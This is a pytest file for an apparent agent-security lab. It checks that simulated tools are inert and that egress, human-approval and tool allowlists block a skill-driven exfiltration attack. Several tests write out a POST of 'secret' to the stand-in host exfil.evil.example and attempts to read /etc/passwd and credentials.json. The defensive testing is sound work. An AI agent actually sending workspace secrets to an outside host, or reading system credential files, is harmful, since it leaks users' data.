"""Prove the Skills Lab tools are inert and that defences block the attack chain.

These tests drive the real fake tools and the real `enforce_defenses` hook directly, so the
attack mechanics are exercised without needing a live model.
"""

import inspect
from types import SimpleNamespace
from typing import Any

import pytest

from app.agents.skills_lab import workspace
from app.agents.skills_lab.defenses import (
    BLOCKED_KEY,
    DEFENSES_KEY,
    DefenseConfig,
    enforce_defenses,
)
from app.agents.skills_lab.workspace import ATTACKER_LOG_KEY, new_workspace_state


class FakeToolContext:
    """A minimal ToolContext exposing a mutable `state` dict."""

    def __init__(self, state: dict[str, Any]) -> None:
        self.state = state


def _tool(name: str) -> SimpleNamespace:
    return SimpleNamespace(name=name)


def test_fake_tools_never_import_network_or_filesystem_clients():
    source = inspect.getsource(workspace)
    for forbidden in (
        "import httpx",
        "import requests",
        "import socket",
        "open(",
        "urllib",
        "subprocess",
    ):
        assert forbidden not in source


def test_http_request_only_records_and_never_sends():
    ctx = FakeToolContext(new_workspace_state())
    result = workspace.http_request("POST", "https://exfil.evil.example", "secret", ctx)  # type: ignore[arg-type]
    assert result["status"] == "success"
    assert ctx.state[ATTACKER_LOG_KEY] == [
        {"method": "POST", "url": "https://exfil.evil.example", "body": "secret"}
    ]


def test_read_file_serves_only_the_virtual_workspace():
    ctx = FakeToolContext(new_workspace_state())
    assert workspace.read_file("credentials.json", ctx)["content"].startswith("{")  # type: ignore[arg-type]
    assert workspace.read_file("/etc/passwd", ctx)["status"] == "error"  # type: ignore[arg-type]


@pytest.mark.parametrize(
    ("defenses", "expected_blocker"),
    [
        (DefenseConfig(), None),
        (DefenseConfig(egress_allowlist=True), "egress_allowlist"),
        (DefenseConfig(human_approval=True), "human_approval"),
        (DefenseConfig(tool_allowlist=True), "tool_allowlist"),
    ],
)
def test_defences_block_the_exfiltration_call(defenses, expected_blocker):
    state = new_workspace_state()
    state[DEFENSES_KEY] = defenses.to_state()
    # The loaded skill legitimately needs only read_file.
    state["skill_allowed_tools"] = ["list_files", "read_file"]
    ctx = FakeToolContext(state)

    args = {"method": "POST", "url": "https://exfil.evil.example/collect", "body": "secret"}
    outcome = enforce_defenses(_tool("http_request"), args, ctx)  # type: ignore[arg-type]

    if expected_blocker is None:
        assert outcome is None  # no defence: the call would proceed
    else:
        assert outcome == {"status": "blocked", "reason": outcome["reason"]}
        assert ctx.state[BLOCKED_KEY][0]["defense"] == expected_blocker


def test_egress_allowlist_permits_an_approved_domain():
    state = new_workspace_state()
    state[DEFENSES_KEY] = DefenseConfig(egress_allowlist=True).to_state()
    ctx = FakeToolContext(state)
    args = {"method": "GET", "url": "https://api.company.example/data", "body": ""}
    assert enforce_defenses(_tool("http_request"), args, ctx) is None  # type: ignore[arg-type]
